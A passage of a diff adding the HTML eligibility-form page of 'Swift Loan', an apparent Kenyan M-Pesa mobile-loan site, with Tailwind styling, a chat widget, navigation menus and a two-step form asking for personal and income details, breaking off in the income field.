@@ -1,0 +1,1675 @@
+<!DOCTYPE html>
+<html lang="en-KE">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Eligibility Form | Swift Loan - Apply for emergency loans in Kenya via M-Pesa</title>
+    <meta name="description" content="Check your eligibility for instant loans with Swift Loan. Quick eligibility check and instant approval for emergency financial needs in Kenya.">
+    
+    <!-- Open Graph Tags -->
+    <meta property="og:title" content="Swift Loan Eligibility Form - Instant Mobile Loans in Kenya">
+    <meta property="og:description" content="Get instant loans up to 200,000 KES via M-Pesa. Quick approval, no collateral needed. Check your eligibility now.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://swiftloan.ke/eligibility.html">
+    
+    <!-- Schema.org structured data -->
+    <script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "FinancialService",
+        "name": "Swift Loan",
+        "alternateName": "Apply for quick online M-Pesa loans. Instant application for emergency with Swift Loan",
+        "description": "Online lender Swift Loan provides instant mobile loans for everyone. Quick borrow money in Kenya with M-Pesa integration.",
+        "url": "https://swiftloan.ke",
+        "telephone": "0709-029-000",
+        "address": {
+            "@type": "PostalAddress",
+            "addressCountry": "KE",
+            "addressLocality": "Nairobi"
+        }
+    }
+    </script>
+
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        primary: '#225AAC',
+                        'primary-dark': '#1a4a8a',
+                        'primary-light': '#e8f1ff'
+                    }
+                }
+            }
+        }
+    </script>
+    
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    
+    <!-- Feather Icons -->
+    <script src="https://unpkg.com/feather-icons@4.29.0/dist/feather.min.js"></script>
+    
+    <style>
+        html {
+            scroll-behavior: smooth;
+        }
+        
+        body {
+            font-family: 'Inter', sans-serif;
+        }
+        
+        .swift-primary { color: #225AAC; }
+        .swift-primary-bg { background-color: #225AAC; }
+        .swift-primary-hover:hover { background-color: #1a4a8a; }
+        .swift-primary-light { background-color: #e8f1ff; }
+        
+        .gradient-hero {
+            background: linear-gradient(135deg, #e8f1ff 0%, #ffffff 100%);
+        }
+        
+        .shadow-swift {
+            box-shadow: 0 10px 25px -5px rgba(34, 90, 172, 0.1), 0 10px 10px -5px rgba(34, 90, 172, 0.04);
+        }
+        
+        .transition-swift {
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .animate-fade-in-up {
+            animation: fadeInUp 0.6s ease-out;
+        }
+        
+        /* Enhanced loading animations */
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        
+        @keyframes bounce-in {
+            0% { transform: scale(0.3); opacity: 0; }
+            50% { transform: scale(1.05); }
+            70% { transform: scale(0.9); }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        
+        @keyframes checkmark {
+            0% { stroke-dashoffset: 100; }
+            100% { stroke-dashoffset: 0; }
+        }
+        
+        .animate-spin { animation: spin 1s linear infinite; }
+        .animate-pulse { animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite; }
+        .animate-bounce-in { animation: bounce-in 0.6s ease-out; }
+        
+        .checkmark-circle {
+            stroke-dasharray: 166;
+            stroke-dashoffset: 166;
+            stroke-width: 2;
+            stroke-miterlimit: 10;
+            stroke: #10b981;
+            fill: none;
+            animation: checkmark 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards;
+        }
+        
+        .checkmark-check {
+            transform-origin: 50% 50%;
+            stroke-dasharray: 48;
+            stroke-dashoffset: 48;
+            animation: checkmark 0.3s cubic-bezier(0.65, 0, 0.45, 1) 0.8s forwards;
+        }
+        
+        /* Progress bar enhancements */
+        .progress-bar {
+            background: linear-gradient(90deg, #225AAC 0%, #4F46E5 100%);
+            transition: width 0.5s ease-in-out;
+        }
+        
+        .progress-glow {
+            box-shadow: 0 0 10px rgba(34, 90, 172, 0.5);
+        }
+        
+        /* Modal enhancements */
+        .modal-backdrop {
+            backdrop-filter: blur(8px);
+            background: rgba(0, 0, 0, 0.6);
+        }
+        
+        .modal-content {
+            background: linear-gradient(145deg, #ffffff 0%, #f8fafc 100%);
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+        }
+        
+        /* Input focus effects */
+        input:focus, select:focus, textarea:focus {
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(34, 90, 172, 0.15) !important;
+        }
+        
+        /* Validation styles */
+        .validation-message.success {
+            color: #10b981;
+            font-weight: 500;
+        }
+        
+        .validation-message.error {
+            color: #ef4444;
+            font-weight: 500;
+        }
+        
+        .validation-message.success::before {
+            content: "✓ ";
+        }
+        
+        .validation-message.error::before {
+            content: "⚠ ";
+        }
+        
+        /* Input states */
+        .input-valid {
+            border-color: #10b981 !important;
+            background-color: #f0fdf4 !important;
+        }
+        
+        .input-invalid {
+            border-color: #ef4444 !important;
+            background-color: #fef2f2 !important;
+        }
+        
+        /* Mobile responsiveness */
+        @media (max-width: 768px) {
+            .form-container {
+                padding: 1rem;
+            }
+            
+            .form-card {
+                padding: 1.5rem;
+                margin: 0;
+                border-radius: 1rem;
+            }
+            
+            .hero-title {
+                font-size: 2rem;
+                line-height: 1.2;
+            }
+            
+            .hero-description {
+                font-size: 1rem;
+            }
+            
+            .step-buttons {
+                flex-direction: column;
+                gap: 1rem;
+            }
+            
+            .step-buttons button {
+                width: 100%;
+                justify-content: center;
+            }
+        }
+        
+        @media (max-width: 640px) {
+            .progress-indicator {
+                flex-direction: column;
+                gap: 1rem;
+                align-items: center;
+            }
+            
+            .progress-bar-container {
+                order: 2;
+                width: 100%;
+                max-width: 200px;
+            }
+        }
+    </style>
+ <!-- Brevo Conversations {literal} -->
+<script>
+    (function(d, w, c) {
+        w.BrevoConversationsID = '67cfe70069e9058aa30db4b2';
+        w[c] = w[c] || function() {
+            (w[c].q = w[c].q || []).push(arguments);
+        };
+        var s = d.createElement('script');
+        s.async = true;
+        s.src = 'https://conversations-widget.brevo.com/brevo-conversations.js';
+        if (d.head) d.head.appendChild(s);
+    })(document, window, 'BrevoConversations');
+</script>
+<!-- /Brevo Conversations {/literal} -->
+</head>
+<body class="bg-white text-gray-800">
+    <!-- Header -->
+    <header class="bg-white shadow-sm border-b border-gray-100 sticky top-0 z-50">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex justify-between items-center h-16">
+                <!-- Logo -->
+                <div class="flex-shrink-0">
+                    <div class="flex items-center">
+                        <div class="w-10 h-10 swift-primary-bg rounded-lg flex items-center justify-center">
+                            <svg class="text-white" width="20" height="20" fill="currentColor" viewBox="0 0 24 24">
+                                <path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/>
+                            </svg>
+                        </div>
+                        <span class="ml-3 text-xl font-bold text-gray-900">Swift Loan</span>
+                    </div>
+                </div>
+
+                <!-- Desktop Navigation -->
+                <nav class="hidden md:flex space-x-8">
+                    <a class='text-gray-700 hover:text-primary transition-colors duration-200' href='/'>Home</a>
+                    <a href="#advantages" class="text-gray-700 hover:text-primary transition-colors duration-200">Our advantages</a>
+                    <a href="#steps" class="text-gray-700 hover:text-primary transition-colors duration-200">How to borrow</a>
+                    <div class="relative group">
+                        <span class="text-gray-700 hover:text-primary cursor-pointer">Swift Loan App</span>
+                        <div class="absolute top-full left-0 w-48 bg-white shadow-lg rounded-lg opacity-0 invisible group-hover:opacity-100 group-hover:visible transition-all duration-200 mt-2">
+                            <a href="#android" class="block px-4 py-2 text-gray-700 hover:bg-gray-50">For Android</a>
+                            <a href="#ios" class="block px-4 py-2 text-gray-700 hover:bg-gray-50">For iOS</a>
+                        </div>
+                    </div>
+                    <a href="#faq" class="text-gray-700 hover:text-primary transition-colors duration-200">FAQ</a>
+                </nav>
+
+                <!-- Action Buttons -->
+                <div class="hidden md:flex items-center space-x-3">
+                    <span class="text-sm text-gray-600 flex items-center">
+                        <svg class="text-primary mr-1" width="16" height="16" fill="currentColor" viewBox="0 0 24 24">
+                            <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/>
+                        </svg>
+                        0709-029-000
+                    </span>
+                    <button class="border border-primary text-primary hover:bg-primary hover:bg-opacity-10 px-4 py-2 text-sm font-medium rounded-md transition-swift">
+                        Log in
+                    </button>
+                </div>
+
+                <!-- Mobile menu button -->
+                <button id="mobileMenuBtn" class="md:hidden p-2" onclick="toggleMobileMenu()">
+                    <svg class="text-primary" width="24" height="24" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"/>
+                    </svg>
+                </button>
+            </div>
+        </div>
+
+        <!-- Mobile Navigation Menu -->
+        <div id="mobile-menu" class="hidden md:hidden fixed inset-0 bg-black bg-opacity-50 z-50">
+            <div class="bg-white w-70 h-3/4 shadow-xl overflow-y-auto scroll-smooth custom-scrollbar">
+                <div class="p-4 border-b">
+                    <div class="flex justify-between items-center">
+                        <div class="flex items-center">
+                            <div class="w-8 h-8 swift-primary-bg rounded-lg flex items-center justify-center">
+                                <svg class="text-white" width="16" height="16" fill="currentColor" viewBox="0 0 24 24">
+                                    <path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/>
+                                </svg>
+                            </div>
+                            <span class="ml-2 text-lg font-bold text-gray-900">Swift Loan</span>
+                        </div>
+                        <button onclick="toggleMobileMenu()">
+                            <svg class="text-gray-500" width="24" height="24" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/>
+                            </svg>
+                        </button>
+                    </div>
+                   <div class="mt-3 text-sm text-gray-600 flex items-start">
+        <!-- WhatsApp Icon -->
+    <svg xmlns="http://www.w3.org/2000/svg" class="text-green-500 mr-2 mt-0.5" width="18" height="18" fill="currentColor" viewBox="0 0 24 24">
+        <path d="M20.52 3.48A11.82 11.82 0 0 0 12 0C5.37 0 .01 5.37.01 12c0 2.11.55 4.16 1.6 5.98L0 24l6.23-1.64a11.94 11.94 0 0 0 5.77 1.46h.01c6.63 0 12-5.37 12-12 0-3.2-1.24-6.21-3.48-8.34zM12 22.01c-1.82 0-3.6-.49-5.14-1.42l-.37-.22-3.7.97.99-3.61-.24-.38A9.96 9.96 0 0 1 2 12c0-5.52 4.48-10 10-10 2.67 0 5.18 1.04 7.07 2.93A9.92 9.92 0 0 1 22 12c0 5.52-4.48 10.01-10 10.01z"/>
+        <path d="M16.54 13.68c-.27-.14-1.59-.78-1.84-.87-.25-.09-.43-.14-.62.14-.18.27-.71.87-.87 1.05-.16.18-.32.2-.59.07-.27-.14-1.13-.42-2.16-1.34-.8-.71-1.34-1.59-1.5-1.86-.16-.27-.02-.42.12-.56.12-.12.27-.32.41-.48.14-.16.18-.27.27-.45.09-.18.05-.34-.02-.48-.07-.14-.62-1.5-.85-2.05-.22-.53-.45-.46-.62-.47h-.53c-.18 0-.48.07-.73.34s-.96.94-.96 2.3 1 .2 1.14.43c.14.23 1.77 3.19 4.29 4.47.6.33 1.07.53 1.43.68.6.25 1.14.21 1.57.13.48-.07 1.59-.65 1.82-1.28.23-.62.23-1.15.16-1.28-.06-.14-.23-.21-.5-.35z"/>
+    </svg>
+
+    <div>
+        <a href="eligibility.html" target="_blank" class="font-semibold text-green-600 hover:underline">
+            Click on the blue icon in the page to contact our support team.
+        </a>
+        <div class="text-xs text-gray-500 mt-1">Mon-Sun: 8am - 6pm</div>
+    </div>
+</div>
+                    <!-- User info in mobile menu -->
+                    <div class="user-section-mobile mt-3 p-3 bg-gray-50 rounded-lg" style="display: none;">
+                        <div class="flex items-center space-x-3">
+                            <div class="w-10 h-10 bg-primary rounded-full flex items-center justify-center">
+                                <span class="text-white text-sm font-medium" id="userInitialsMobile">U</span>
+                            </div>
+                            <div class="flex-1">
+                                <div class="text-sm font-medium text-gray-900" id="userEmailMobile">user@example.com</div>
+                                <div class="text-xs text-gray-500" id="sessionTimeMobile">Session: 10h 0m</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <nav class="p-4 space-y-4">
+
+  <!-- Home -->
+  <a class="group flex items-center text-gray-700 hover:text-primary py-2" href="/" onclick="toggleMobileMenu()">
+    <svg class="w-5 h-5 mr-2 text-blue-600 group-hover:text-primary" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">
+      <path d="M3 10L12 3l9 7v11H3V10z"/>
+      <path d="M9 21v-6h6v6"/>
+    </svg>
+    Home
+  </a>
+
+  <!-- Check My Loan Eligibility -->
+  <a class="group flex items-center text-gray-700 hover:text-primary py-2" href="/eligibility" onclick="toggleMobileMenu()">
+    <svg class="w-5 h-5 mr-2 text-green-600 group-hover:text-primary" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">
+      <circle cx="12" cy="12" r="9"/>
+      <path d="M8 12l3 3 5-5"/>
+    </svg>
+    Check My Loan Eligibility
+  </a>
+
+  <!-- About Us -->
+  <a class="group flex items-center text-gray-700 hover:text-primary py-2" href="/about" onclick="toggleMobileMenu()">
+    <svg class="w-5 h-5 mr-2 text-indigo-600 group-hover:text-primary" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">
+      <circle cx="12" cy="12" r="9"/>
+      <path d="M12 10v6M12 7h.01"/>
+    </svg>
+    About Us
+  </a>
+
+  <!-- Terms of Service -->
+  <a class="group flex items-center text-gray-700 hover:text-primary py-2" href="/terms" onclick="toggleMobileMenu()">
+    <svg class="w-5 h-5 mr-2 text-purple-600 group-hover:text-primary" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">
+      <path d="M6 3h8l4 4v14H6z"/>
+      <path d="M8 11h8M8 15h8"/>
+    </svg>
+    Terms of Service
+  </a>
+
+  <!-- Privacy Policy -->
+  <a class="group flex items-center text-gray-700 hover:text-primary py-2" href="/privacy" onclick="toggleMobileMenu()">
+    <svg class="w-5 h-5 mr-2 text-rose-600 group-hover:text-primary" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">
+      <path d="M12 3l8 4v6a8 8 0 11-16 0V7l8-4z"/>
+      <path d="M9 13a3 3 0 016 0v2H9v-2z"/>
+    </svg>
+    Privacy Policy
+  </a>
+
+  <!-- Track My Loan Application -->
+  <a class="group flex items-center text-gray-700 hover:text-primary py-2" href="/track" onclick="toggleMobileMenu()">
+    <svg class="w-5 h-5 mr-2 text-teal-600 group-hover:text-primary" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">
+      <circle cx="12" cy="12" r="9"/>
+      <path d="M12 7v5l3 3"/>
+    </svg>
+    Track My Loan Application
+  </a>
+
+  <!-- Loan Rules -->
+  <a class="group flex items-center text-gray-700 hover:text-primary py-2" href="/rules" onclick="toggleMobileMenu()">
+    <svg class="w-5 h-5 mr-2 text-amber-600 group-hover:text-primary" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">
+      <path d="M4 6h16M6 10h12M8 14h8M10 18h4"/>
+    </svg>
+    Loan Rules
+  </a>
+
+  <!-- Support Centre -->
+  <a class="group flex items-center text-gray-700 hover:text-primary py-2" href="/support" onclick="toggleMobileMenu()">
+    <svg class="w-5 h-5 mr-2 text-sky-600 group-hover:text-primary" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">
+      <path d="M4 5h16v10H8l-4 4V5z"/>
+      <path d="M9 9h6"/>
+    </svg>
+    Support Centre
+  </a>
+
+  <!-- Referrals & Promotions -->
+  <a class="group flex items-center text-gray-700 hover:text-primary py-2" href="/referral.html" onclick="toggleMobileMenu()">
+    <svg class="w-5 h-5 mr-2 text-pink-600 group-hover:text-primary" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">
+      <rect x="3" y="10" width="18" height="10" rx="2"/>
+      <path d="M3 10h18M7 10V7a2 2 0 114 0v3M13 10V7a2 2 0 114 0v3"/>
+    </svg>
+    Referrals & Promotions
+  </a>
+
+  <!-- Account Deletion -->
+  <a class="group flex items-center text-gray-700 hover:text-primary py-2" href="/account-deletion" onclick="toggleMobileMenu()">
+    <svg class="w-5 h-5 mr-2 text-red-600 group-hover:text-primary" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">
+      <path d="M4 7h16M9 7V5h6v2M7 7v13h10V7"/>
+      <path d="M10 11v6M14 11v6"/>
+    </svg>
+    Account Deletion
+  </a>
+
+  <!-- Help -->
+  <a class="group flex items-center text-gray-700 hover:text-primary py-2" href="/help" onclick="toggleMobileMenu()">
+    <svg class="w-5 h-5 mr-2 text-cyan-600 group-hover:text-primary" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">
+      <circle cx="12" cy="12" r="9"/>
+      <path d="M9.5 10a2.5 2.5 0 115 0c0 1.5-2.5 1.5-2.5 3"/>
+      <path d="M12 17h.01"/>
+    </svg>
+    Help
+  </a>
+
+  <!-- Swift Loan for Android -->
+  <a href="#" onclick="downloadApp(); toggleMobileMenu();" class="group flex items-center text-gray-700 hover:text-primary py-2 pl-1">
+    <svg class="w-5 h-5 mr-2 text-green-700 group-hover:text-primary" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">
+      <rect x="7" y="3" width="10" height="18" rx="2"/>
+      <path d="M10 6h4M12 19h.01"/>
+    </svg>
+    Swift Loan for Android
+  </a>
+</nav>
+     <div class="absolute bottom-4 left-1/2 transform -translate-x-1/2">
+  <span class="block text-red-600 font-bold text-xl animate-bounce">
+    ↓ Scroll for more ↓
+  </span>
+</div>
+<div class="pt-4 border-t space-y-2">
+  <button onclick="showLoadingAndRedirect('eligibility.html'); toggleMobileMenu();" class="w-full swift-primary-bg hover:swift-primary-hover text-white py-3 font-medium rounded-md transition-swift">
+    Apply Now
+  </button>
+  <button class="login-btn w-full border border-primary text-primary hover:bg-primary hover:bg-opacity-10 py-3 font-medium rounded-md transition-swift" onclick="window.location.href='/login.html'">
+    Log in
+  </button>
+</div>
+                        <button class="logout-btn w-full border border-red-500 text-red-500 hover:bg-red-500 hover:text-white py-3 font-medium rounded-md transition-swift" onclick="performLogout()" style="display: none;">
+                            Logout
+                        </button>
+                         <div class="text-center py-4">
+                          <div class="absolute bottom-4 left-1/2 transform -translate-x-1/2">
+                         <span class="block text-red-600 font-bold text-xl animate-bounce">
+                          ↓ Scroll for more ↓
+                          </span>
+                           </div>
+                          </div>
+                    </div>
+                </nav>
+            </div>
+        </div>
+    </header>
+    <!-- Main Content -->
+    <main class="bg-gradient-to-br from-blue-50 via-white to-blue-100 min-h-screen py-8">
+        <!-- Hero Section -->
+        <section class="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 mb-12">
+            <div class="text-center animate-fade-in-up">
+                <!-- Badge -->
+                <div class="inline-flex items-center px-4 py-2 bg-blue-100 text-blue-800 rounded-full text-sm font-medium mb-6">
+                    <svg class="mr-2" width="16" height="16" fill="currentColor" viewBox="0 0 24 24">
+                        <path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                    </svg>
+                    Instant Loan Eligibility Check
+                </div>
+
+                <h1 class="hero-title text-3xl lg:text-4xl xl:text-5xl font-bold text-gray-900 leading-tight mb-6">
+                    Check Your Loan 
+                    <span class="swift-primary relative">
+                        Eligibility
+                        <svg class="absolute -bottom-2 left-0 w-full h-3 text-blue-200" viewBox="0 0 200 12" fill="currentColor">
+                            <path d="M0,6 Q50,0 100,6 T200,6 L200,12 L0,12 Z" />
+                        </svg>
+                    </span> 
+                    in Minutes
+                </h1>
+                
+                <p class="hero-description text-xl text-gray-600 mb-8 leading-relaxed max-w-3xl mx-auto">
+                    Complete this quick form to check your eligibility for an instant loan up to 200,000 KES. 
+                    Get approved in minutes and receive money directly to your M-Pesa account.
+                </p>
+                
+                <!-- Key Features -->
+                <div class="grid sm:grid-cols-3 gap-4 mb-8 max-w-2xl mx-auto">
+                    <div class="flex items-center justify-center bg-white bg-opacity-50 backdrop-blur-sm rounded-lg p-3 hover:bg-white hover:bg-opacity-70 transition-all duration-200">
+                        <div class="w-8 h-8 bg-green-100 rounded-full flex items-center justify-center mr-3">
+                            <svg class="text-green-600" width="16" height="16" fill="currentColor" viewBox="0 0 24 24">
+                                <circle cx="12" cy="12" r="10"/><polyline points="12,6 12,12 16,14"/>
+                            </svg>
+                        </div>
+                        <span class="text-gray-700 font-medium">2 minutes to complete</span>
+                    </div>
+                    <div class="flex items-center justify-center bg-white bg-opacity-50 backdrop-blur-sm rounded-lg p-3 hover:bg-white hover:bg-opacity-70 transition-all duration-200">
+                        <div class="w-8 h-8 bg-green-100 rounded-full flex items-center justify-center mr-3">
+                            <svg class="text-green-600" width="16" height="16" fill="currentColor" viewBox="0 0 24 24">
+                                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                            </svg>
+                        </div>
+                        <span class="text-gray-700 font-medium">100% secure</span>
+                    </div>
+                    <div class="flex items-center justify-center bg-white bg-opacity-50 backdrop-blur-sm rounded-lg p-3 hover:bg-white hover:bg-opacity-70 transition-all duration-200">
+                        <div class="w-8 h-8 bg-green-100 rounded-full flex items-center justify-center mr-3">
+                            <svg class="text-green-600" width="16" height="16" fill="currentColor" viewBox="0 0 24 24">
+                                <polyline points="20,6 9,17 4,12"/>
+                            </svg>
+                        </div>
+                        <span class="text-gray-700 font-medium">Instant results</span>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Progress Indicator -->
+        <div class="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 mb-8">
+            <div class="progress-indicator flex items-center justify-center space-x-4">
+                <div class="flex items-center">
+                    <div id="step1Indicator" class="w-10 h-10 rounded-full swift-primary-bg text-white flex items-center justify-center font-semibold">1</div>
+                    <span id="step1Text" class="ml-2 text-sm font-medium swift-primary">Personal Details</span>
+                </div>
+                <div class="progress-bar-container w-16 h-1 bg-gray-200 rounded">
+                    <div id="progressBar" class="h-1 swift-primary-bg rounded transition-all duration-500" style="width: 50%;"></div>
+                </div>
+                <div class="flex items-center">
+                    <div id="step2Indicator" class="w-10 h-10 rounded-full bg-gray-200 text-gray-500 flex items-center justify-center font-semibold">2</div>
+                    <span id="step2Text" class="ml-2 text-sm font-medium text-gray-500">Other Details</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Form Container -->
+        <div class="form-container max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
+            <form id="eligibilityForm" class="space-y-6">
+                <!-- Step 1: Personal Details -->
+                <div id="step1" class="form-card bg-white rounded-2xl shadow-swift p-6 md:p-8 border border-gray-100">
+                    <div class="flex items-center mb-8">
+                        <div class="w-12 h-12 swift-primary-bg rounded-xl flex items-center justify-center mr-4">
+                            <i data-feather="user" class="w-6 h-6 text-white"></i>
+                        </div>
+                        <div>
+                            <h2 class="text-2xl font-bold text-gray-900">Personal Details</h2>
+                            <p class="text-gray-600">Tell us about yourself to get started</p>
+                        </div>
+                    </div>
+
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                        <!-- Full Name -->
+                        <div class="col-span-full">
+                            <label for="fullName" class="block text-sm font-semibold text-gray-700 mb-3">
+                                <i data-feather="user" class="w-4 h-4 inline mr-2 swift-primary"></i>
+                                Full Name
+                            </label>
+                            <input 
+                                type="text" 
+                                id="fullName" 
+                                name="fullName" 
+                                required
+                                class="w-full px-4 py-4 border border-gray-300 rounded-xl focus:ring-2 focus:ring-primary focus:border-transparent transition-swift placeholder-gray-400 text-lg"
+                                placeholder="Enter your full name"
+                            >
+                            <div class="validation-message mt-2 text-sm"></div>
+                        </div>
+
+                        <!-- National ID -->
+                        <div>
+                            <label for="nationalId" class="block text-sm font-semibold text-gray-700 mb-3">
+                                <i data-feather="credit-card" class="w-4 h-4 inline mr-2 swift-primary"></i>
+                                National ID Number
+                            </label>
+                            <input 
+                                type="text" 
+                                id="nationalId" 
+                                name="nationalId" 
+                                required
+                                maxlength="8"
+                                class="w-full px-4 py-4 border border-gray-300 rounded-xl focus:ring-2 focus:ring-primary focus:border-transparent transition-swift placeholder-gray-400 text-lg"
+                                placeholder="12345678"
+                            >
+                            <div class="validation-message mt-2 text-sm"></div>
+                        </div>
+
+                        <!-- Date of Birth -->
+                        <div>
+                            <label for="dateOfBirth" class="block text-sm font-semibold text-gray-700 mb-3">
+                                <i data-feather="calendar" class="w-4 h-4 inline mr-2 swift-primary"></i>
+                                Date of Birth
+                            </label>
+                            <input 
+                                type="date" 
+                                id="dateOfBirth" 
+                                name="dateOfBirth" 
+                                required
+                                class="w-full px-4 py-4 border border-gray-300 rounded-xl focus:ring-2 focus:ring-primary focus:border-transparent transition-swift text-lg"
+                            >
+                            <div class="validation-message mt-2 text-sm"></div>
+                        </div>
+
+                        <!-- Phone Number -->
+                        <div>
+                            <label for="phoneNumber" class="block text-sm font-semibold text-gray-700 mb-3">
+                                <i data-feather="phone" class="w-4 h-4 inline mr-2 swift-primary"></i>
+                                Phone Number
+                            </label>
+                            <input 
+                                type="tel" 
+                                id="phoneNumber" 
+                                name="phoneNumber" 
+                                required
+                                class="w-full px-4 py-4 border border-gray-300 rounded-xl focus:ring-2 focus:ring-primary focus:border-transparent transition-swift placeholder-gray-400 text-lg"
+                                placeholder="0712345678 or 254712345678"
+                            >
+                            <div class="validation-message mt-2 text-sm"></div>
+                        </div>
+
+                        <!-- Email Address -->
+                        <div>
+                            <label for="email" class="block text-sm font-semibold text-gray-700 mb-3">
+                                <i data-feather="mail" class="w-4 h-4 inline mr-2 swift-primary"></i>
+                                Email Address
+                            </label>
+                            <input 
+                                type="email" 
+                                id="email" 
+                                name="email" 
+                                required
+                                class="w-full px-4 py-4 border border-gray-300 rounded-xl focus:ring-2 focus:ring-primary focus:border-transparent transition-swift placeholder-gray-400 text-lg"
+                                placeholder="your@email.com"
+                            >
+                            <div class="validation-message mt-2 text-sm"></div>
+                        </div>
+                    </div>
+
+                    <!-- Next Button -->
+                    <div class="mt-10 flex justify-end">
+                        <button 
+                            type="button" 
+                            id="nextBtn"
+                            disabled
+                            class="px-8 py-3 swift-primary-bg text-white font-semibold rounded-xl hover:swift-primary-hover transition-swift disabled:bg-gray-300 disabled:cursor-not-allowed flex items-center space-x-2 shadow-swift"
+                        >
+                            <span>Next Step</span>
+                            <i data-feather="arrow-right" class="w-5 h-5"></i>
+                        </button>
+                    </div>
+
+                    <!-- Scroll Indicator -->
+                    <div class="mt-6 text-center">
+                        <p class="swift-primary font-semibold flex items-center justify-center">
+                            <i data-feather="arrow-down" class="w-4 h-4 mr-2 animate-bounce"></i>
+                            Please scroll down to proceed
+                        </p>
+                    </div>
+                </div>
+
+                <!-- Step 2: Other Details -->
+                <div id="step2" class="form-card bg-white rounded-2xl shadow-swift p-6 md:p-8 border border-gray-100 hidden">
+                    <div class="flex items-center mb-8">
+                        <div class="w-12 h-12 swift-primary-bg rounded-xl flex items-center justify-center mr-4">
+                            <i data-feather="briefcase" class="w-6 h-6 text-white"></i>
+                        </div>
+                        <div>
+                            <h2 class="text-2xl font-bold text-gray-900">Other Details</h2>
+                            <p class="text-gray-600">Additional information for your loan application</p>
+                        </div>
+                    </div>
+
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                        <!-- Employment Status -->
+                        <div>
+                            <label for="employmentStatus" class="block text-sm font-semibold text-gray-700 mb-3">
+                                <i data-feather="briefcase" class="w-4 h-4 inline mr-2 swift-primary"></i>
+                                Employment Status
+                            </label>
+                            <select 
+                                id="employmentStatus" 
+                                name="employmentStatus" 
+                                required
+                                class="w-full px-4 py-4 border border-gray-300 rounded-xl focus:ring-2 focus:ring-primary focus:border-transparent transition-swift text-lg"
+                            >
+                                <option value="">Select employment status</option>
+                                <option value="employed">Employed</option>
+                                <option value="self_employed">Self-employed</option>
+                                <option value="student">Student</option>
+                                <option value="unemployed">Unemployed</option>
+                            </select>
+                            <div class="validation-message mt-2 text-sm"></div>
+                        </div>
+
+                        <!-- Monthly Income -->
+                        <div>
+                            <label for="monthlyIncome" class="block text-sm font-semibold text-gray-700 mb-3">
+                                <i data-feather="dollar-sign" class="w-4 h-4 inline mr-2 swift-primary"></i>
+                                Monthly Income
+                            </label>
+                            <select 
+                                id="monthlyIncome" 
+                                name="monthlyIncome" 
+                                required
+                                class="w-full px-4 py-4 border border-gray-300 rounded-xl focus:ring-2 focus:ring-primary focus:border-transparent transition-swift text-lg"
+                            >
+                                <option value="">Select income range</option>
+                                <option value="0-9999">Below 10,000 KES</option>
+                                <option value="10000-49999">10,000 - 49,999 KES</option>
+                                <option value="50000-99999">50,000 - 99,999 KES</option>
